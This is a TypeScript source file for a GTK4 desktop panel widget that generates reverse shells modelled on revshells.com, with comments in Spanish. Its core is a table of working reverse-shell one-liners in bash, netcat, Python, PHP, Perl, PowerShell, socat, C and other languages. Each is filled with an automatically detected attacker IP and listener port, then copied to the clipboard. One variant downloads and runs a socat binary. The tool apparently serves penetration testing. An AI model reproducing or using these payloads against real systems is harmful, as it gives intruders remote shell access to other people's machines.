import { Gtk } from "ags/gtk4";
import Gdk from "gi://Gdk?version=4.0";
import { createState, onCleanup, Accessor } from "ags";
import GLib from "gi://GLib?version=2.0";
import Gio from "gi://Gio?version=2.0";
import { timeout } from "ags/time";
import { execAsync } from "ags/process";
import OkButton from "../common/OkButton";

// ─────────────────────────────────────────────
//  Generador de reverse shells estilo revshells.com
//  IP y puerto editables; elige lenguaje y copia la variante.
// ─────────────────────────────────────────────

type Shell = { name: string; tpl: string };

// Plantillas con marcadores {IP} y {PORT}. Se usan comillas invertidas para
// poder incluir ' y " libremente; los '$' literales van escapados como \$.
const SHELLS: Record<string, Shell[]> = {
    "Bash": [
        { name: "Bash -i", tpl: `bash -i >& /dev/tcp/{IP}/{PORT} 0>&1` },
        { name: "Bash 196", tpl: `0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196` },
        { name: "Bash read line", tpl: `exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done` },
        { name: "Bash 5", tpl: `bash -c 'exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done'` },
        { name: "Bash udp", tpl: `bash -i >& /dev/udp/{IP}/{PORT} 0>&1` },
    ],
    "sh": [
        { name: "sh -i", tpl: `sh -i >& /dev/tcp/{IP}/{PORT} 0>&1` },
        { name: "/bin/sh -i", tpl: `/bin/sh -i >& /dev/tcp/{IP}/{PORT} 0>&1` },
    ],
    "nc": [
        { name: "nc mkfifo", tpl: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f` },
        { name: "nc -e", tpl: `nc {IP} {PORT} -e /bin/sh` },
        { name: "nc -e bash", tpl: `nc {IP} {PORT} -e /bin/bash` },
        { name: "nc -c", tpl: `nc -c /bin/sh {IP} {PORT}` },
        { name: "nc OpenBSD", tpl: `mkfifo /tmp/p; nc {IP} {PORT} 0</tmp/p | /bin/sh >/tmp/p 2>&1; rm /tmp/p` },
        { name: "nc.traditional -e", tpl: `nc.traditional {IP} {PORT} -e /bin/bash` },
        { name: "BusyBox nc", tpl: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | busybox nc {IP} {PORT} > /tmp/f` },
    ],
    "ncat": [
        { name: "ncat -e", tpl: `ncat {IP} {PORT} -e /bin/bash` },
        { name: "ncat mkfifo", tpl: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat {IP} {PORT} >/tmp/f` },
        { name: "ncat udp", tpl: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|ncat -u {IP} {PORT} >/tmp/f` },
    ],
    "Python": [
        { name: "Python3 pty", tpl: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` },
        { name: "Python3 short", tpl: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'` },
        { name: "Python3 export", tpl: `export RHOST="{IP}";export RPORT={PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'` },
        { name: "Python2", tpl: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/sh")'` },
        { name: "Python3 subprocess", tpl: `python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("{IP}",{PORT}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'` },
        { name: "Python2 short", tpl: `python -c 'import socket,os,pty;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'` },
    ],
    "PHP": [
        { name: "PHP exec", tpl: `php -r '\$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'` },
        { name: "PHP shell_exec", tpl: `php -r '\$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");'` },
        { name: "PHP system", tpl: `php -r '\$sock=fsockopen("{IP}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");'` },
        { name: "PHP passthru", tpl: `php -r '\$sock=fsockopen("{IP}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");'` },
        { name: "PHP popen", tpl: `php -r '\$sock=fsockopen("{IP}",{PORT});popen("/bin/sh -i <&3 >&3 2>&3", "r");'` },
        { name: "PHP proc_open", tpl: `php -r '\$s=fsockopen("{IP}",{PORT});\$proc=proc_open("/bin/sh -i", array(0=>\$s, 1=>\$s, 2=>\$s),\$pipes);'` },
    ],
    "Perl": [
        { name: "Perl", tpl: `perl -e 'use Socket;\$i="{IP}";\$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
        { name: "Perl no sh", tpl: `perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,"{IP}:{PORT}");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'` },
        { name: "Perl windows", tpl: `perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,"{IP}:{PORT}");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'` },
    ],
    "Ruby": [
        { name: "Ruby", tpl: `ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
        { name: "Ruby no sh", tpl: `ruby -rsocket -e'exit if fork;c=TCPSocket.new("{IP}","{PORT}");loop{c.gets.chomp!;(exit! if \$_=="exit");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts "failed: #{\$_}"}'` },
    ],
    "socat": [
        { name: "socat", tpl: `socat TCP:{IP}:{PORT} EXEC:/bin/sh` },
        { name: "socat tty", tpl: `socat TCP:{IP}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane` },
        { name: "socat (descarga)", tpl: `wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:{IP}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane` },
    ],
    "PowerShell": [
        { name: "PowerShell", tpl: `powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"` },
    ],
    "awk": [
        { name: "awk", tpl: `awk 'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null` },
    ],
    "Telnet": [
        { name: "Telnet", tpl: `TF=\$(mktemp -u);mkfifo \$TF && telnet {IP} {PORT} 0<\$TF | /bin/sh 1>\$TF` },
    ],
    "Lua": [
        { name: "Lua 5.1", tpl: `lua5.1 -e 'local host, port = "{IP}", {PORT} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'` },
    ],
    "Node.js": [
        { name: "Node.js", tpl: `node -e 'sh = require("child_process").spawn("/bin/sh");var client = new (require("net").Socket)();client.connect({PORT}, "{IP}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});'` },
    ],
    "zsh": [
        { name: "zsh", tpl: `zsh -c 'zmodload zsh/net/tcp && ztcp {IP} {PORT} && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY'` },
    ],
    "Groovy": [
        { name: "Groovy", tpl: `String host="{IP}";int port={PORT};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();` },
    ],
    "Java": [
        { name: "Java", tpl: `Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \$line 2>&5 >&5; done"});p.waitFor();` },
    ],
    "Golang": [
        { name: "Golang", tpl: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go` },
    ],
    "OpenSSL": [
        { name: "OpenSSL", tpl: `mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {IP}:{PORT} > /tmp/s; rm /tmp/s` },
    ],
    "Dart": [
        { name: "Dart", tpl: `import 'dart:io';import 'dart:convert';main(){Socket.connect("{IP}", {PORT}).then((socket){socket.listen((data){Process.start('/bin/sh', []).then((Process process){process.stdin.writeln(new String.fromCharCodes(data).trim());process.stdout.transform(utf8.decoder).listen((output){socket.write(output);});});});});}` },
    ],
    "C": [
        { name: "C", tpl: `#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\nint main(void){int p={PORT};struct sockaddr_in r;r.sin_family=AF_INET;r.sin_port=htons(p);r.sin_addr.s_addr=inet_addr("{IP}");int s=socket(AF_INET,SOCK_STREAM,0);connect(s,(struct sockaddr *)&r,sizeof(r));dup2(s,0);dup2(s,1);dup2(s,2);execve("/bin/sh",NULL,NULL);return 0;}` },
    ],
    "Crystal": [
        { name: "Crystal (system)", tpl: `crystal eval 'require "socket";c=TCPSocket.new("{IP}",{PORT});loop{m=c.gets;break if m.nil?;system(m.to_s,output: c,error: c)}'` },
    ],
};

const LANGS = Object.keys(SHELLS);

function fill(tpl: string, ip: string, port: string): string {
    return tpl.split("{IP}").join(ip).split("{PORT}").join(port);
}

function copyText(text: string) {
    try {
        const proc = Gio.Subprocess.new(["wl-copy"], Gio.SubprocessFlags.STDIN_PIPE);
        const stdin = proc.get_stdin_pipe();
        stdin?.write_bytes_async(
            new GLib.Bytes(new TextEncoder().encode(text)),
            GLib.PRIORITY_DEFAULT, null,
            (s, r) => { try { s!.write_bytes_finish(r); s!.close(null); } catch (e) { /* noop */ } }
        );
    } catch (e) { console.error("Error copiando reverse shell:", e); }
}

// IP -4 de la primera interfaz cuyo nombre casa con el regex (o "" si ninguna).
async function ipOnIface(ifaceRegex: string): Promise<string> {
    const cmd = `ip -o -4 addr show | awk '$2 ~ /${ifaceRegex}/ {print $4}' | cut -d/ -f1 | head -n1`;
    return (await execAsync(["bash", "-c", cmd])).trim();
}

// LHOST por prioridad: VPN de engagement (tun/wg) primero; tailscale y otras
// mesh como respaldo; si no hay túnel, la IP de la interfaz con ruta por defecto.
async function detectLhost(): Promise<string> {
    try {
        return (await ipOnIface("^(tun|wg)[0-9]+$"))
            || (await ipOnIface("^(tailscale|nordlynx|proton)"))
            || (await execAsync(["bash", "-c",
                "ip -4 -o addr show dev \"$(ip route | awk '/default/{print $5; exit}')\" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1"])).trim();
    } catch { return ""; }
}

// LPORT: detecta un listener activo (nc/ncat/python/ruby); si no, 4444.
async function detectLport(): Promise<string> {
    try {
        const cmd = "ss -ltnp 2>/dev/null | grep -E 'nc|ncat|python|ruby' | awk '{print $4}' | cut -d: -f2 | head -n1";
        const port = (await execAsync(["bash", "-c", cmd])).trim();
        return port || "4444";
    } catch { return "4444"; }
}

export function ReverseShellGenerator({ onClose, revealed }: { onClose: () => void, revealed?: Accessor<boolean> }) {
    let lhost = "";
    let lport = "4444";
    let ipEntry: Gtk.Entry | null = null;
    let portEntry: Gtk.Entry | null = null;

    const [langName, setLangName] = createState(LANGS[0]);

    // Lista de variantes (ListBox imperativo): navegación con flechas y
    // activación con Enter nativas.
    let variantList: Gtk.ListBox | null = null;
    let langFlowBox: Gtk.FlowBox | null = null;

    // Devuelve el foco al lenguaje actualmente seleccionado en el FlowBox.
    const focusCurrentLang = () => {
        const idx = LANGS.indexOf(langName.get());
        const child = langFlowBox?.get_child_at_index(idx < 0 ? 0 : idx);
        child?.grab_focus();
    };

    // Vista previa del código que se va a copiar. Se actualiza al seleccionar
    // una variante (con teclado o ratón).
    let previewBuffer: Gtk.TextBuffer | null = null;
    let currentShell: Shell = SHELLS[LANGS[0]][0];
    const renderPreview = (shell: Shell) => {
        currentShell = shell;
        const ip = (lhost.trim() || "127.0.0.1");
        const port = (lport.trim() || "4444");
        previewBuffer?.set_text(fill(shell.tpl, ip, port), -1);
    };

    // Autodetecta LHOST/LPORT y rellena las cajas (siguen siendo editables).
    const refresh = () => {
        detectLhost().then((ip) => { if (ip) { lhost = ip; if (ipEntry) ipEntry.text = ip; } renderPreview(currentShell); });
        detectLport().then((p) => { lport = p; if (portEntry) portEntry.text = p; renderPreview(currentShell); });
    };
    refresh();

    // Al abrir el launcher: re-detecta (por si conectaste la VPN) y enfoca la IP.
    if (revealed) {
        const unsub = revealed.subscribe(() => {
            if (!revealed.get()) return;
            refresh();
            timeout(150, () => { ipEntry?.grab_focus_without_selecting(); });
        });
        onCleanup(unsub);
    }

    const copyVariant = (shell: Shell) => {
        const ip = (lhost.trim() || "127.0.0.1");
        const port = (lport.trim() || "4444");
        const cmd = fill(shell.tpl, ip, port);
        copyText(cmd);
        execAsync(["notify-send", "-a", "OkPanel Security",
            `Reverse shell copiada (${langName.get()})`,
            `${ip}:${port}`]).catch(() => {});
        onClose();
    };

    // Reconstruye las filas del ListBox con las variantes del lenguaje actual
    // y deja seleccionada la primera (lo que actualiza la vista previa).
    const rebuildVariants = () => {
        const lb = variantList;
        if (!lb) return;
        let child = lb.get_first_child();
        while (child) {
            const next = child.get_next_sibling();
            lb.remove(child);
            child = next;
        }
        const list = SHELLS[langName.get()] ?? [];
        for (const shell of list) {
            const lbl = new Gtk.Label({ label: `󰅍  ${shell.name}`, xalign: 0 });
            lbl.add_css_class("labelSmall");
            lbl.set_margin_start(12);
            lbl.set_margin_end(12);
            lbl.set_margin_top(8);
            lbl.set_margin_bottom(8);
            lb.append(lbl);
        }
        const first = lb.get_row_at_index(0);
        if (first) lb.select_row(first);
    };
    const unsubLang = langName.subscribe(rebuildVariants);
    onCleanup(unsubLang);

    return <box orientation={Gtk.Orientation.VERTICAL} spacing={6}>
        <box spacing={6}>
            <entry
                hexpand={true}
                placeholderText="LHOST / IP"
                $={(self) => {
                    ipEntry = self;
                    self.text = lhost;
                    self.connect("changed", () => { lhost = self.text; });
                }}/>
            <entry
                widthRequest={90}
                placeholderText="Puerto"
                $={(self) => {
                    portEntry = self;
                    self.text = lport;
                    self.connect("changed", () => { lport = self.text; });
                }}/>
        </box>

        <Gtk.FlowBox
            $={(fb) => {
                langFlowBox = fb;
                fb.add_css_class("langGrid");
                fb.set_selection_mode(Gtk.SelectionMode.NONE);
                fb.set_max_children_per_line(5);
                fb.set_min_children_per_line(3);
                fb.set_homogeneous(true);
                fb.set_column_spacing(4);
                fb.set_row_spacing(4);
                // Solo Enter/doble clic activa el lenguaje (no el clic simple),
                // para distinguir "navegar" de "seleccionar".
                fb.set_activate_on_single_click(false);
                for (const name of LANGS) {
                    const btn = <OkButton
                        hexpand={true}
                        label={name}
                        cssClasses={langName.as((l) => l === name ? ["active-tab"] : [])}
                        onClicked={() => setLangName(name)}/> as Gtk.Widget;
                    fb.append(btn);
                }
                // Enter (o doble clic) sobre un lenguaje: despliega sus shells y
                // baja el foco a la lista de variantes.
                fb.connect("child-activated", (_, child) => {
                    const name = LANGS[child.get_index()];
                    if (!name) return;
                    setLangName(name);
                    const first = variantList?.get_row_at_index(0);
                    if (first) {
                        variantList?.select_row(first);
                        first.grab_focus();
                    }
                });
            }}/>

        <Gtk.ListBox
            cssClasses={["variantList"]}
            $={(lb) => {
                variantList = lb;
                lb.set_selection_mode(Gtk.SelectionMode.SINGLE);
                // Al moverte por la lista (flechas/clic) se previsualiza la shell.
                lb.connect("row-selected", (_, row) => {
                    if (!row) return;
                    const shell = (SHELLS[langName.get()] ?? [])[row.get_index()];
                    if (shell) renderPreview(shell);
                });
                // Enter o doble clic copia la variante seleccionada.
                lb.connect("row-activated", (_, row) => {
                    const shell = (SHELLS[langName.get()] ?? [])[row.get_index()];
                    if (shell) copyVariant(shell);
                });
                // Flecha Arriba en la primera fila: vuelve a la lista de lenguajes.
                const keyCtrl = new Gtk.EventControllerKey();
                keyCtrl.set_propagation_phase(Gtk.PropagationPhase.CAPTURE);
                keyCtrl.connect("key-pressed", (_, keyval) => {
                    if (keyval === Gdk.KEY_Up || keyval === Gdk.KEY_Left) {
                        const sel = lb.get_selected_row();
                        if (!sel || sel.get_index() === 0) {
                            focusCurrentLang();
                            return true;
                        }
                    }
                    return false;
                });
                lb.add_controller(keyCtrl);
                rebuildVariants();
            }}/>

        <label marginTop={6} xalign={0} cssClasses={["labelSmall"]} label="Vista previa (Enter para copiar)" />
        <Gtk.ScrolledWindow
            vexpand={true}
            heightRequest={120}
            cssClasses={["codePreviewScroll"]}
            hscrollbarPolicy={Gtk.PolicyType.NEVER}>
            <Gtk.TextView
                editable={false}
                cursorVisible={false}
                monospace={true}
                wrapMode={Gtk.WrapMode.WORD_CHAR}
                cssClasses={["codePreview"]}
                leftMargin={8} rightMargin={8} topMargin={8} bottomMargin={8}
                $={(self) => {
                    previewBuffer = self.get_buffer();
                    renderPreview(currentShell);
                }}/>
        </Gtk.ScrolledWindow>
    </box>;
}
